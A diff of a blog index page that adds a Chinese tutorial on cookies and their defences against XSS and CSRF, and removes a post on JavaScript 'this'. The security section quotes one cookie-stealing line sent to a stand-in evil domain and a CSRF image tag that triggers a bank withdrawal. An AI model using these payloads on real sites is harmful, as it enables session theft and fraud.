@@ -160,6 +160,228 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-basic-cookies" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/09/basic-cookies/">管中窥豹看Cookie</a>
+    </h1>
+  
+
+        
+        <a href="/2019/04/09/basic-cookies/" class="archive-article-date">
+  	<time datetime="2019-04-09T13:14:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">详细参数</a>。</p>
+<h2 id="Cookie介绍"><a href="#Cookie介绍" class="headerlink" title="Cookie介绍"></a>Cookie介绍</h2><p>以下Wikipedia、MDN对cookie的介绍</p>
+<blockquote>
+<p><strong>Wikipedia:</strong></p>
+<p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p>
+<p><strong>MDN:</strong></p>
+<p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p>
+</blockquote>
+<p><strong>划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态</strong></p>
+<p>Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。</p>
+<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/2019/04/09/basic-cookies/./exchange-cookies.png" alt="cookies消息传递">Cookies的传输</div>
+
+<p><strong>注意</strong>：<em>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。</em></p>
+<h2 id="Cookie的特性"><a href="#Cookie的特性" class="headerlink" title="Cookie的特性"></a>Cookie的特性</h2><h3 id="前端数据存储及读写"><a href="#前端数据存储及读写" class="headerlink" title="前端数据存储及读写"></a>前端数据存储及读写</h3><p>Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">document.cookie</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式</span></span><br><span class="line"><span class="comment">// 可设置path，domain，max-age，expires，secure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 删除cookie 通过设置过去的时间删除cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() - <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 修改cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=false; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 查找cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">"需要查找的cookie"</span>).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie)</span><br></pre></td></tr></table></figure></p>
+<h3 id="后端通过http头设置"><a href="#后端通过http头设置" class="headerlink" title="后端通过http头设置"></a>后端通过http头设置</h3><p>后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie<a href="https://github.com/pillarjs/cookies" target="_blank" rel="noopener">参数</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以nodejs为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">response.getHeader(<span class="string">"Cookie"</span>);</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">response.setHeader(<span class="string">"Cookie"</span>, [<span class="string">"name=gdccwxx"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以koa为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">ctx.cookies.get(name, [options])</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure></p>
+<h3 id="请求时通过http头传给后端"><a href="#请求时通过http头传给后端" class="headerlink" title="请求时通过http头传给后端"></a>请求时通过http头传给后端</h3><p>以Google键入请求为例</p>
+<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/2019/04/09/basic-cookies/./font-transfer-cookie.png" alt="请求Google">请求通过http头传送给后端</div>
+
+<h3 id="遵守同源策略"><a href="#遵守同源策略" class="headerlink" title="遵守同源策略"></a>遵守同源策略</h3><p>Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。<br>Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。</p>
+<h2 id="Cookie作用及用途"><a href="#Cookie作用及用途" class="headerlink" title="Cookie作用及用途"></a>Cookie作用及用途</h2><h3 id="Cookie的作用"><a href="#Cookie的作用" class="headerlink" title="Cookie的作用"></a>Cookie的作用</h3><p><strong>存储个性化设置</strong><br>即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。</p>
+<div style="width: 80%; margin: 0 auto; text-align: center"><br>    <img src="/2019/04/09/basic-cookies/./out-path-cookie.png" alt="在主页的cookie"><br><br><br>  在google.com的cookie<br><br><br>  <img src="/2019/04/09/basic-cookies/./in-path-cookie.png" alt="在搜索的cookie"><br><br><br>  在google.com/search的cookie<br><br><br></div>
+
+<p>正因为cookie的作用域，使得cookie存储有着多样性。</p>
+<p><strong>存储未登陆时用户唯一标识</strong></p>
+<p>在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。<br>具体操作：<br>1、向未登陆的用户发送一个唯一的标识。<br>2、保留唯一标识所做的事情。<br>3、用户登录后关联账户及唯一标识所做的事情。</p>
+<p>以新浪微博为例：</p>
+<div style="width: 80%; margin: 0 auto; text-align: center"><br><img src="/2019/04/09/basic-cookies/./unlogin-cookie.png" alt="未登陆状态下的cookie"><br><br><br>未登录状态下的cookie：login_sid_t表示唯一标识<br></div>
+
+<p>通过唯一标识与登录态的绑定，可建立游客态与用户态的关联</p>
+<p><strong>存储已经登陆用户的凭证</strong><br>cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。</p>
+<p><strong>存储其他业务数据</strong><br>可存储其他业务信息，例如用户生日等</p>
+<h3 id="Cookie的用途"><a href="#Cookie的用途" class="headerlink" title="Cookie的用途"></a>Cookie的用途</h3><p>了解Cookie的作用后，其主要用途是以下三个方面：</p>
+<ul>
+<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
+<li>个性化设置（如用户自定义设置、主题等）</li>
+<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
+</ul>
+<h2 id="Cookie-的安全策略"><a href="#Cookie-的安全策略" class="headerlink" title="Cookie 的安全策略"></a>Cookie 的安全策略</h2><h3 id="Cookie与XSS的关系"><a href="#Cookie与XSS的关系" class="headerlink" title="Cookie与XSS的关系"></a>Cookie与XSS的关系</h3><p>在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></p>
+<p>这种情况下的cookie则会发送到攻击者的网站。</p>
+<h4 id="分析XSS攻击："><a href="#分析XSS攻击：" class="headerlink" title="分析XSS攻击："></a>分析XSS攻击：</h4><ul>
+<li>会话被劫持</li>
+<li>通过document获取cookie</li>
+</ul>
+<h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><ul>
+<li>会话劫持：使用cookie中Secure标识</li>
+<li>不被JavaScript调用cookie：使用cookie中HttpOnly标识</li>
+</ul>
+<h4 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）</strong></p>
+<blockquote>
+<p>一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。</p>
+</blockquote>
+<p>用法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure>
+<p><strong>HttpOnly</strong></p>
+<blockquote>
+<p>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  <code>Document.cookie</code> 属性、<code>XMLHttpRequest</code> 和  <code>Request</code>APIs 进行访问，以防范跨站脚本攻击（XSS）。</p>
+</blockquote>
+<p>用法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure>
+<h3 id="Cookie与CSRF的关系"><a href="#Cookie与CSRF的关系" class="headerlink" title="Cookie与CSRF的关系"></a>Cookie与CSRF的关系</h3><p>CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。<br>以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。</p>
+<h4 id="分析CSRF攻击"><a href="#分析CSRF攻击" class="headerlink" title="分析CSRF攻击"></a>分析CSRF攻击</h4><ul>
+<li>被攻击者本地Cookie信息没有过期</li>
+<li>银行转账系统无二次确认，直接转账</li>
+<li>第三方网站（不安全的聊天室或论坛）加载请求</li>
+<li>攻击者无法读写Cookie</li>
+</ul>
+<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ul>
+<li>敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间</li>
+<li>增加二次确认：目标网站对敏感操作无二次确认</li>
+<li>不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。</li>
+<li>允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识</li>
+</ul>
+<h4 id="参数介绍-1"><a href="#参数介绍-1" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）</strong></p>
+<blockquote>
+<p>允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。</p>
+</blockquote>
+<p>用法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite <span class="comment">// default SameSite=Strict</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>请求类型</strong></th>
+<th><strong>例子</strong></th>
+<th><strong>非 SameSit</strong></th>
+<th><strong>SameSite = Lax</strong></th>
+<th><strong>SameSite = Strict</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">link</td>
+<td>&lt;a href=”…”></td>
+<td>Y</td>
+<td>Y</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">prerender</td>
+<td>\&lt;link rel=”prerender” href=”…”></td>
+<td>Y</td>
+<td>Y</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">form get</td>
+<td>&lt;form method=”get” action=”…”></td>
+<td>Y</td>
+<td>Y</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">form post</td>
+<td>&lt;form method=”post” action=”…”></td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">iframe</td>
+<td>&lt;iframe src=”…”></td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">ajax</td>
+<td>$.get(‘…’)</td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">image</td>
+<td>&lt;img src=”…”></td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+</tbody>
+</table>
+<h2 id="要点总结："><a href="#要点总结：" class="headerlink" title="要点总结："></a>要点总结：</h2><ul>
+<li><strong>Cookie是服务器保存在本地的数据块</strong></li>
+<li><strong>每次请求都会包含cookie，因此会比较浪费资源</strong></li>
+<li><strong>使用document.cookie可访问非HttpOnly的cookie</strong></li>
+<li><strong>删除本地cookie只能通过给cookie设置过去的Expire删除</strong></li>
+<li><strong>常用鉴别用户身份的方法是给cookie设置签名或token</strong></li>
+<li><strong>为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer</strong></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">HTTP</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/04/09/basic-cookies/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-《大型网站技术架》读书笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1300,99 +1522,6 @@
 
 
   
-    <article id="post-you-dont-konwn-javascript-this" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/09/06/you-dont-konwn-javascript-this/">你不知道的javascript————this和对象原型</a>
-    </h1>
-  
-
-        
-        <a href="/2017/09/06/you-dont-konwn-javascript-this/" class="archive-article-date">
-  	<time datetime="2017-09-06T12:29:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="this误解"><a href="#this误解" class="headerlink" title="this误解"></a>this误解</h3><p>从字面意思来看,this貌似是指向自身的.因此出现各种各样的误解.</p>
-<h5 id="指向自身"><a href="#指向自身" class="headerlink" title="指向自身"></a>指向自身</h5><p>先看一个demo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function foo(num) &#123;</span><br><span class="line">	console.log(&quot;foo: &quot; + num);</span><br><span class="line">	this.count++;</span><br><span class="line">&#125;</span><br><span class="line">foo.count = 0;</span><br><span class="line">var i;</span><br><span class="line">for (i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">	if(i &gt; 5) &#123;</span><br><span class="line">		foo(i)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">// foo: 6</span><br><span class="line">// foo: 7</span><br><span class="line">// foo: 8</span><br><span class="line">// foo: 9</span><br><span class="line">console.log(this.count)	// NaN</span><br></pre></td></tr></table></figure></p>
-<p>从上述例子中,可以很清楚的看到函数被调用了四次,而为什么打印出来的this.count是NaN呢?显然this指向的count并不是函数的count.的确在foo.count=0的时候给对象foo加了一个count,但是内部代码this.count却不是指向的那个函数对象.从第二章的理解当中,不难发现,其创建了一个全局count,并且它是NaN.</p>
-<h3 id="this是什么"><a href="#this是什么" class="headerlink" title="this是什么?"></a>this是什么?</h3><p>this是在运行时绑定的,并不是在编写时绑定的.他的上下文取决于函数调用时的各种条件,this绑定和函数声明没有任何关系,取决于函数的调用方式.</p>
-<p>当一个函数被调用时,会创建一个活动记录(有时候称之为上下文).这个记录会包含函数在哪里被调用(调用栈)、函数的调用方式、传入的参数信息,而this就是这个记录的一个属性。会在函数执行过程中用到。</p>
-<p><em>PS:说白了，THIS实际上是在函数调用时发生的绑定，他指向什么完全取决于函数在哪里被调用。</em></p>
-<h5 id="调用位置"><a href="#调用位置" class="headerlink" title="调用位置"></a>调用位置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function baz() &#123;</span><br><span class="line">	// 当前作用栈是： baz</span><br><span class="line">	// 因此调用位置是全局作用域</span><br><span class="line">	console.log(&quot;baz&quot;)</span><br><span class="line">	bar()			// &lt;-- bar的调用位置</span><br><span class="line">&#125;</span><br><span class="line">function bar() &#123;</span><br><span class="line">	// 当前调用栈是baz -&gt; bar</span><br><span class="line">	// 因此调用位置是baz中</span><br><span class="line">	console.log(&quot;bar&quot;)</span><br><span class="line">	foo();		// &lt;-- foo的调用位置</span><br><span class="line">&#125;</span><br><span class="line">function foo() &#123;</span><br><span class="line">	// 当前调用栈是baz -&gt; bar -&gt; foo</span><br><span class="line">	// 当前调用位置在bar中</span><br><span class="line">	console.log(&quot;foo&quot;)</span><br><span class="line">&#125;</span><br><span class="line">baz()    // &lt;-- baz的调用位置</span><br></pre></td></tr></table></figure>
-<p>从上述调用栈，可以分析出真正的调用位置，他决定了this的绑定</p>
-<h3 id="四种绑定规则"><a href="#四种绑定规则" class="headerlink" title="四种绑定规则"></a>四种绑定规则</h3><h5 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var a = 2;</span><br><span class="line">foo();	// 2</span><br><span class="line">///////////////////////</span><br><span class="line">function foo2() &#123;</span><br><span class="line">	&quot;use strict&quot;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var a =2</span><br><span class="line">foo2() 		// typeerror</span><br><span class="line">////////////////////////</span><br><span class="line">function foo3() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var a =2</span><br><span class="line">(function () &#123;</span><br><span class="line">	&quot;use strict&quot;</span><br><span class="line">	foo3()		// 2</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
-<p>在非严格模式下，foo的调用默认指向调用位置，例子中是全局，而在严格模式下会抛出异常，在严格模式调用其他位置的this，也可以调用。</p>
-<h5 id="隐式绑定"><a href="#隐式绑定" class="headerlink" title="隐式绑定"></a>隐式绑定</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var obj = &#123;</span><br><span class="line">	a : 2,</span><br><span class="line">	foo : foo</span><br><span class="line">&#125;</span><br><span class="line">obj.foo 	// 2</span><br></pre></td></tr></table></figure>
-<p>在代码中，foo默认是绑定在obj的foo的属性上，因此隐式的把foo中的this绑定在obj之上，调用的也是obj中的a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var obj2 = &#123;</span><br><span class="line">	a:42,</span><br><span class="line">	foo:foo</span><br><span class="line">&#125;</span><br><span class="line">var obj1 = &#123;</span><br><span class="line">	a: 2,</span><br><span class="line">	obj2: obj2</span><br><span class="line">&#125;</span><br><span class="line">obj1.obj2.foo() 	// 42</span><br></pre></td></tr></table></figure></p>
-<p>在上面的代码中，经过多层的调用，但是最终结果还是指向的是最后一层调用的位置。因此可以的出结论。在对象属性引用链中只有上一层或者说最后一层在调用位置中起作用。</p>
-<h5 id="隐式丢失"><a href="#隐式丢失" class="headerlink" title="隐式丢失"></a>隐式丢失</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 隐式丢失，成为默认绑定</span><br><span class="line">function foo() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var obj = &#123;</span><br><span class="line">	a:2,</span><br><span class="line">	foo: foo</span><br><span class="line">&#125;</span><br><span class="line">var bar = obj.foo</span><br><span class="line">var a = &quot;this is global&quot;</span><br><span class="line">bar()			// this is global</span><br><span class="line">////////////////////////////////////////</span><br><span class="line">// 回调的隐式丢失</span><br><span class="line">function foo() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">function doFoo(fn) &#123;</span><br><span class="line">	// fn其实引用的是foo</span><br><span class="line">	fn()		// 调用位置</span><br><span class="line">&#125;</span><br><span class="line">var obj = &#123;</span><br><span class="line">	a: 2,</span><br><span class="line">	foo: foo</span><br><span class="line">&#125;</span><br><span class="line">var a = &quot;this is global&quot;</span><br><span class="line">doFoo(obj.foo)	// this is global</span><br></pre></td></tr></table></figure>
-<p>虽然bar是obj.foo的一个引用，但实际上，它引用的是foo函数本身，因此此时的bar()其实是一个不带任何修饰的函数调用，因此引用了默认绑定。<br>第二种情况也是如此，在回调时的隐式丢失导致的问题<br>这也导致setTimeout中的隐式丢失，常用方法是将this绑定到一个变量中，这样就不会导致隐式丢失</p>
-<h5 id="显式绑定"><a href="#显式绑定" class="headerlink" title="显式绑定"></a>显式绑定</h5><p>使用call，和apply方法绑定。<br><strong>1、硬绑定</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var obj = &#123;</span><br><span class="line">	a:2</span><br><span class="line">&#125;</span><br><span class="line">var bar = function () &#123;</span><br><span class="line">	foo.call(obj)</span><br><span class="line">&#125;</span><br><span class="line">bar()		// 2</span><br><span class="line">setTimeout(bar, 100)	// 2</span><br><span class="line">bar.call(window)	// 2</span><br></pre></td></tr></table></figure></p>
-<p>无论是强制显示调用window，他都是2.因为在bar这个函数中调用了foo.call(obj)，最终都会绑定到obj上。为了硬绑定的应用，ES5中有bind方法，专门用于绑定。</p>
-<p><strong>API调用的“上下文”</strong><br>和bind一样，他的作用是保证回调<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo(el) &#123;</span><br><span class="line">	console.log(el, this.id)</span><br><span class="line">&#125;</span><br><span class="line">var obj = &#123;</span><br><span class="line">	id: &quot;awesome&quot;</span><br><span class="line">&#125;</span><br><span class="line">[1, 2, 3].forEach(foo, obj) 	// 调用时将this绑定到obj上</span><br></pre></td></tr></table></figure></p>
-<p><strong>new 绑定</strong><br>使用new来调用函数，会自动执行以下操作：<br>1、创建一个全新的对象<br>2、这个新对象会被执行[[Prototype]]连接<br>3、这个新对象会绑定到函数调用的this<br>4、如果函数没有返回其他对象，那么new表达式中的函数中会自动调用这个对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">function foo(a)&#123;</span><br><span class="line">	this.a = a</span><br><span 